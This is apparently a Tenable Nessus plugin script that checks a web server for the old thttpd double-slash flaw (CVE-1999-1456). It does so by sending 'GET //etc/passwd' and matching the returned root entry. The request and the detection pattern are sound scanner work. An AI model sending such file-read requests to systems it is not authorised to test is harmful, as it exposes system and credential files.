#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10286);
 script_version ("$Revision: 1.34 $");
 script_cvs_date("$Date: 2015/11/18 21:03:58 $");
 script_cve_id("CVE-1999-1456");
 script_osvdb_id(7361);
 
 script_name(english:"thttpd Double Slash Request Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to use the remote web server to read arbitrary files on the
remote system." );
 script_set_attribute(attribute:"description", value:
"The remote HTTP server allows an attacker to read arbitrary files
on the remote host with the privileges of the web server, simply by 
adding a slash in front of its name. 

For instance, 'GET //etc/passwd' will return the contents of the
remote file '/etc/passwd'." );
 script_set_attribute(attribute:"solution", value:
"Upgrade your web server or change it." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_set_attribute(attribute:"plugin_publication_date", value: "1999/06/22");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 summary["english"] = "check thttpd for /etc/passwd";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 1999-2015 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

w = http_send_recv3(method:"GET", item:"/etc/passwd", port:port);
if (isnull(w)) exit(1, "the web server did not answer");
rep = w[2];

if (egrep(pattern:".*root:.*:0:[01]:.*", string:rep))exit(0);

u = "//etc/passwd";
w = http_send_recv3(method:"GET", item:u, port:port);
if (isnull(w)) exit(1, "the web server did not answer");
rep = w[2];

if (egrep(pattern:".*root:.*:0:[01]:.*", string:rep))
  security_warning(port:port, extra: 
strcat('GET ', u, ' returns :\n\n', rep, 
 '\nClicking on this URL may show the flaw :\n', 
 build_url(qs: u, port:port), '\n'));

